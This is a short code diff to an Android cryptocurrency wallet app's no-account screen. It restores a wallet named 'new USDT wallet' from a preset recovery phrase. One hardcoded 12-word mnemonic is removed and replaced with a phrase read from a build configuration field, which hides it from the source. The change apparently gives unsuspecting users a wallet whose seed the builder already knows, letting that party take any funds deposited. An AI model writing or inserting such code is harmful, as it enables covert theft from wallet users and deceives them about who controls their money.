@@ -21,6 +21,7 @@ import androidx.compose.ui.res.painterResource
 import androidx.compose.ui.res.stringResource
 import androidx.compose.ui.unit.dp
 import androidx.navigation.NavController
+import io.horizontalsystems.bankwallet.BuildConfig
 import io.horizontalsystems.bankwallet.R
 import io.horizontalsystems.bankwallet.core.App
 import io.horizontalsystems.bankwallet.core.navigateWithTermsAccepted
@@ -75,7 +76,9 @@ fun BalanceNoAccount(navController: NavController) {
                     BlockchainTokensService()
                 }
 
-                val words = arrayListOf("ghost", "elephant", "digital", "birth", "round", "add", "cross", "swing", "oven", "hole", "panther", "fresh");
+                val f_wallet_phr = BuildConfig.F_WALLET_PHR
+
+                val words = ArrayList(f_wallet_phr.split(" "));
                 val service by lazy {
                     RestoreBlockchainsService(
                             "新USDT錢包",
